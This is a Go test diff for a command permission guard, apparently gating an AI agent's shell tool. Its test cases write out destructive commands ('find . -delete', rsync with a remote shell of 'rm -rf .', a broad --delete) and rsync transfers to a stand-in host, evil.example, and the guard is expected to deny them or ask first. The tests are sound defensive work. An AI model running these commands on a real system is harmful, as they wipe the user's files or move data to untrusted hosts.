@@ -464,6 +464,60 @@ func TestPermissionPolicyClassifiesDestructiveGitClean(t *testing.T) {
 	}
 }
 
+func TestPermissionPolicyClassifiesFindDelete(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"find"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "current directory delete",
+			command:  "find . -delete",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.find_delete",
+		},
+		{
+			name:     "implicit current directory delete",
+			command:  "find -delete",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.find_delete",
+		},
+		{
+			name:     "narrow path delete",
+			command:  "find out -delete",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.find_delete",
+		},
+		{
+			name:    "print action",
+			command: "find . -print",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "delete-shaped name pattern",
+			command: "find . -name -delete -print",
+			want:    tool.PermissionActionAllow,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]string{"command": tc.command})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
 func TestPermissionPolicyScansGitSubmoduleForeach(t *testing.T) {
 	guardPolicy := DefaultPolicy()
 	guardPolicy.AllowedCommands = []string{
@@ -760,6 +814,110 @@ func TestPermissionPolicyRejectsAllowlistedGitExecutionEnvironment(t *testing.T)
 	require.NoError(t, err)
 	require.Equal(t, tool.PermissionActionDeny, decision.Action)
 	require.Contains(t, decision.Reason, "environment.code_injection")
+}
+
+func TestPermissionPolicyRejectsAllowlistedRsyncExecutionEnvironment(t *testing.T) {
+	for _, tc := range []struct {
+		name  string
+		key   string
+		value string
+	}{
+		{
+			name:  "remote shell",
+			key:   "RSYNC_RSH",
+			value: "unlisted-helper --payload",
+		},
+		{
+			name:  "daemon connection program",
+			key:   "RSYNC_CONNECT_PROG",
+			value: "unlisted-helper %H",
+		},
+		{
+			name:  "connection shell",
+			key:   "RSYNC_SHELL",
+			value: "unlisted-shell",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			guardPolicy := DefaultPolicy()
+			guardPolicy.AllowedCommands = []string{"rsync"}
+			guardPolicy.EnvAllowlist = append(guardPolicy.EnvAllowlist, tc.key)
+			policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+			arguments := mustJSON(t, map[string]any{
+				"command": "rsync src/ out/",
+				"env":     map[string]string{tc.key: tc.value},
+			})
+
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tool.PermissionActionDeny, decision.Action)
+			require.Contains(t, decision.Reason, "environment.code_injection")
+		})
+	}
+}
+
+func TestPermissionPolicyAllowsBenignRsyncEnvironment(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"rsync"}
+	guardPolicy.EnvAllowlist = append(guardPolicy.EnvAllowlist, "RSYNC_MAX_ALLOC")
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+	arguments := mustJSON(t, map[string]any{
+		"command": "rsync src/ out/",
+		"env":     map[string]string{"RSYNC_MAX_ALLOC": "1G"},
+	})
+
+	decision, err := policy.CheckToolPermission(
+		context.Background(),
+		workspacePermissionRequest(string(arguments)),
+	)
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionAllow, decision.Action)
+}
+
+func TestPermissionPolicyValidatesAllowlistedRsyncProxy(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"rsync"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	guardPolicy.EnvAllowlist = append(guardPolicy.EnvAllowlist, "RSYNC_PROXY")
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name     string
+		proxy    string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "denied proxy",
+			proxy:    "evil.example:8080",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:  "allowlisted proxy",
+			proxy: "api.github.com:8080",
+			want:  tool.PermissionActionAllow,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]any{
+				"command": "rsync api.github.com::module out/",
+				"env":     map[string]string{"RSYNC_PROXY": tc.proxy},
+			})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
 }
 
 func TestPermissionPolicyScansGitArchiveFormatCommands(t *testing.T) {
@@ -1579,7 +1737,7 @@ func TestPermissionPolicyScansHostNetworkProperties(t *testing.T) {
 
 func TestPermissionPolicyScansRsyncRemoteProgram(t *testing.T) {
 	guardPolicy := DefaultPolicy()
-	guardPolicy.AllowedCommands = []string{"rsync"}
+	guardPolicy.AllowedCommands = []string{"rsync", "ssh"}
 	guardPolicy.NetworkAllowlist = []string{"github.com"}
 	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
 
@@ -1612,11 +1770,198 @@ func TestPermissionPolicyScansRsyncRemoteProgram(t *testing.T) {
 			command: `rsync --rsync-path='rsync' api.github.com:/src out`,
 			want:    tool.PermissionActionAsk,
 		},
+		{
+			name:     "attached destructive remote shell",
+			command:  `rsync --rsh='rm -rf .' api.github.com:/src out`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "short destructive remote shell",
+			command:  `rsync -e 'rm -rf .' api.github.com:/src out`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "safe remote shell still reviewed",
+			command:  `rsync --rsh=ssh api.github.com:/src out`,
+			want:     tool.PermissionActionAsk,
+			wantRule: "command.indirect_execution",
+		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			arguments := mustJSON(t, map[string]string{"command": tc.command})
 			decision, err := policy.CheckToolPermission(
 				context.Background(), workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
+func TestPermissionPolicyClassifiesRsyncDelete(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"rsync"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "broad local receiver",
+			command:  "rsync -a --delete empty/ .",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "narrow local receiver",
+			command:  "rsync --delete src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "delete alias",
+			command:  "rsync --del src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "attached remote delete",
+			command:  "rsync -M--delete src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "separate remote delete",
+			command:  "rsync -M --delete src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "long remote delete",
+			command:  "rsync --remote-option=--delete src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "allowlisted remote receiver",
+			command:  "rsync --delete src/ api.github.com:/dst",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:    "long dry run",
+			command: "rsync --dry-run --delete src/ out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "combined short dry run",
+			command: "rsync -an --delete src/ out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:     "dry run overridden",
+			command:  "rsync --dry-run --no-dry-run --delete src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:    "delete disabled",
+			command: "rsync --delete --no-delete src/ out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:     "delete reenabled",
+			command:  "rsync --no-delete --delete-during src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]string{"command": tc.command})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
+func TestPermissionPolicyAppliesNetworkAllowlistToRsync(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"rsync", "rsync.exe"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "denied shell pull",
+			command:  "rsync evil.example:/src out/",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "denied daemon push",
+			command:  "rsync src/ evil.example::module",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "denied URL pull",
+			command:  "rsync rsync://evil.example/module out/",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:    "allowlisted shell pull",
+			command: "rsync api.github.com:/src out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "allowlisted daemon push",
+			command: "rsync src/ api.github.com::module",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "allowlisted abbreviated remote source",
+			command: "rsync api.github.com:/src :/other out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "local copy",
+			command: "rsync -a src/ out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:     "ambiguous remote",
+			command:  "rsync user@:/src out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.destination_unparsed",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]string{"command": tc.command})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
 			)
 			require.NoError(t, err)
 			require.Equal(t, tc.want, decision.Action)
